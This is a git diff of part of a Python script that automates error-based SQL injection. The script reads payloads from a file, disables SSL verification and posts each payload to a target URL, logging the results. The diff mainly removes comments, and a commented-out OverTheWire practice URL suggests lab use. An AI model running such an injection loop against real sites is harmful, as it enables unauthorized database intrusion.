@@ -36,20 +36,19 @@ async def Error_based_inj(urls):
     # ack = requests.post(urls)
     """This is for error based SQL injection. You can realize to the SQL structure by this Injection if it works."""
     try: 
-        global pattern,htmlpattern #* Declare the lists as an global variable
-        done = False #* Creates flag False for the done value
-        filename = "Error_based.txt" #* This is a file that is on the same directory as the python file
-        current_directory = os.path.dirname(os.path.abspath((__file__))) #* Obtain current directory
-        file_path = os.path.join(current_directory, filename) #* Obtain the file path
-        #! We do that because we cannot count on the initial directory path so we need the precise of it on any device
+        global pattern,htmlpattern 
+        done = False 
+        filename = "Error_based.txt" 
+        current_directory = os.path.dirname(os.path.abspath((__file__)))
+        file_path = os.path.join(current_directory, filename)
 
-        with open(file_path, "r") as file: #* Opens the file as read mode
-            payload = file.read() #* Reads the file
-            rows = payload.split("\n") #* Splits the rows with \n
-            sorted_rows = sorted(rows) #* Sort the lists
-            sorted_payload = "\n".join(sorted_rows) #* Join the program
-            print(Fore.RED + str(sorted_payload)) #* Display the payload
-            requests.packages.urllib3.disable_warnings()  # *Disable SSL warnings for the practice
+        with open(file_path, "r") as file: 
+            payload = file.read()
+            rows = payload.split("\n")
+            sorted_rows = sorted(rows) 
+            sorted_payload = "\n".join(sorted_rows) 
+            print(Fore.RED + str(sorted_payload)) 
+            requests.packages.urllib3.disable_warnings()  
             # url = "https://redtiger.labs.overthewire.org/level1.php"
             req = requests.get(url=urls,verify=False)
             if req.status_code == 200:
@@ -65,7 +64,6 @@ async def Error_based_inj(urls):
                         }
                         
                         ##############################################################################
-                        # print(line) #*  We may need that 
                         ack = requests.post(url=urls, data=params,verify=False)
                         print(f"[{datetime.now()}]","|Current payload: |", line,"|with status code|:",ack.status_code,"|Attack:|",attack_type)
                         logging.info(f"sending payloads to the target:{urls},Time:{datetime.now()},attack:{attack_type}")
